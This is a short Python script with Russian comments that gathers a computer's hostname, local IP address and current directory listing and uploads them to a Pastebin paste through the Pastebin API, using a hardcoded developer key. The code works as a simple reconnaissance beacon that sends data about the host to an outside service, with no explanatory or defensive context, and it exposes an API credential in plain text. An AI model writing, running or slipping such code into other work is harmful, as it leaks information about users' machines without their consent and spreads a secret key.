import socket,os,requests,time

url="https://pastebin.com/api/api_post.php"


hostname=socket.gethostname()
ip=socket.gethostbyname(hostname)

dir=os.listdir()

API_DEV_KEY="YMioKfd8RVH5Zxur4kmMV0rz_6PS8TMe"  # Вставьте свой API ключ Pastebin
api_paste_code = f"ip {ip}   dir {dir}"  # Код или текст для пасты
api_paste_name = 'My Python Paste'  # Название пасты
api_paste_format = 'text'  # Формат пасты (например, python, text)
url = 'https://pastebin.com/api/api_post.php'
data = {
    'api_dev_key': API_DEV_KEY,
    'api_option': 'paste',
    'api_paste_code': api_paste_code,
    'api_paste_name': api_paste_name,
    'api_paste_format': api_paste_format
    }
response = requests.post(url, data=data)

if response.status_code == 200:
    print('Паста успешно создана на Pastebin!')
    print('Ссылка на пасту:', response.text)
else:
    print('Ошибка при создании пасты на Pastebin')
time.sleep(5)


